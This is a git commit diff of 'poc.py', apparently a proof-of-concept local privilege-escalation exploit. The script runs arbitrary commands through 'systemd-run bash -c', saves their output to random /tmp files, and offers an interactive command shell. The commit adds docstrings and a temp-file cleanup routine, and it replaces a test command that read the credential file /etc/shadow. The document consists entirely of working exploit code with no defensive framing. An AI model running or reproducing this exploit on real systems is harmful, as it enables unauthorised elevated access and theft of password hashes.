66de74a1f149f64c256e7a8179197e0981aea663
ekultek <Ekultek@users.noreply.github.com>
2018-12-18 08:56:20 -0600

    will now clean up after itself and clean the temporary files

--- poc.py
+++ poc.py
@@ -14,27 +14,52 @@ import shlex
 import random
 import subprocess
 
-
+# template that will be used to run the commands
 COMMAND_TEMPLATE = "systemd-run bash -c '{} > {}'"
 
 
 def results_filename(path="/tmp", length=7):
+    """
+    generate a filename to store the results in
+    """
     retval = []
     for _ in range(length):
         retval.append(random.choice(string.ascii_letters))
-    return "{}/{}.txt".format(path, ''.join(retval))
+    return "{}/{}.POC".format(path, ''.join(retval))
+
+
+def clean_temp_files(path="/tmp"):
+    """
+    clean the generated temporary files
+    """
+    for item in os.listdir(path):
+        if "POC" in item:
+            try:
+                subprocess.call(shlex.split("systemd-run bash -c 'rm /tmp/{}' 2>/dev/null".format(item)))
+            except:
+                print("issue cleaning {}".format(item))
+    print("cleaned temp files")
 
 
 def read_results_file(path):
+    """
+    read the results
+    """
     with open(path) as data:
         return data.read()
 
 
 def send_command(command, res_file):
+    """
+    send the command
+    """
     return subprocess.call(shlex.split(COMMAND_TEMPLATE.format(command, res_file)))
 
 
 def create_shell_interpreter():
+    """
+    create the shell
+    """
     while True:
         command = raw_input("> ")
         res_file_name = results_filename()
@@ -43,25 +68,26 @@ def create_shell_interpreter():
         time.sleep(3)
         print("\n>> {}".format(open(res_file_name).read()))
         print("-" * 30)
-        time.sleep(3)
-        try:
-            os.remove(res_file_name)
-        except:
-            print("issue cleaning: {}".format(res_file_name))
 
 
 def main():
+    """
+    main function
+    """
     try:
-        print("-" * 30)
+        print("testing")
         results_file = results_filename()
-        command = "cat /etc/shadow"
+        command = "echo"
         send_command(command, results_file)
-        print("-" * 30)
+        print("launching shell")
         create_shell_interpreter()
     except KeyboardInterrupt:
-        print("user quit...")
+        print("user quit")
+        clean_temp_files()
     except Exception as e:
         print("error: {}".format(e))
+        clean_temp_files()
+    clean_temp_files()
 
 
 if __name__ == "__main__":
